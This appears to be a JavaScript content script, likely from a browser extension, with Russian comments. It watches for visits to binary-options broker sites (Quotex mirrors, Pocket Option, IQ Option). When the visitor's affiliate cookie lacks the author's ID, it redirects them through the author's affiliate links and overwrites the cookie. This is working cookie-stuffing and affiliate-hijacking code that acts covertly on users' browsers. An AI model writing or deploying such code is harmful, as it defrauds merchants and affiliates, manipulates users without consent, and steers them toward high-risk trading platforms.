// Поиск куки
function get_cookie(cookie_name) {
  let results = document.cookie.match(
    "(^|;) ?" + cookie_name + "=([^;]*)(;|$)"
  );

  if (results) return unescape(results[2]);
  else return null;
}

// Установка куки
function setCookie(name, value, options = {}) {
  options = {
    path: "/",
    // при необходимости добавьте другие значения по умолчанию
    ...options,
  };

  if (options.expires instanceof Date) {
    options.expires = options.expires.toUTCString();
  }

  let updatedCookie =
    encodeURIComponent(name) + "=" + encodeURIComponent(value);

  for (let optionKey in options) {
    updatedCookie += "; " + optionKey;
    let optionValue = options[optionKey];
    if (optionValue !== true) {
      updatedCookie += "=" + optionValue;
    }
  }

  document.cookie = updatedCookie;
}

// Основная логика: проверка доменов Quotex и редирект при отсутствии куки
let url = window.location.hostname;
if (
  url === "quotex.com" ||
  url === "qxbroker.com" ||
  url === "qtx-broker.com" ||
  url === "quotex-market.io" ||
  url === "quotex-market.pro" ||
  url === "qxbroker.pro" ||
  url === "qtxbrk.com" ||
  url === "quotex-market.trade" ||
  url === "quotex-trade.io" ||
  url === "qx-market.com" ||
  url === "market-qx.pro" ||
  url === "qx-market.io" ||
  url === "market-qx.trade"
) {
  let cuci = get_cookie("lid");
  if (cuci != "221930") {
    document.location.href = "https://youlink.biz/anNz";
    setCookie("lid", 221930, (options = {}));
    document.cookie = `lid=221930; domain=.${url}`;
  }
}

// Проверка доменов Pocket Option (p.finance, pocketoption.com)
if (url === "p.finance" || url === "pocketoption.com") {
  const ac = get_cookie("ac");
  if (ac !== "youlink") {
    // Партнёрская ссылка
    document.location.href = "https://poaffiliate.onelink.me/t5P7/igof3a3d";
    setCookie("ac", "youlink", (options = {}));
    document.cookie = `ac=youlink; domain=.${url}`;
  }
}

// Проверка доменов IQ Option (iqoption.net, iqoption.com)
if (url === "iqoption.net" || url === "iqoption.com") {
  const aff = get_cookie("aff");
  if (aff !== "1074") {
    // Партнёрская ссылка IQ Option
    document.location.href =
      "https://affiliate.iqoption.net/redir/?aff=1074&aff_model=revenue&afftrack=aisignals";
    setCookie("aff", "1074", (options = {}));
    document.cookie = `aff=1074; domain=.${url}`;
  }
}

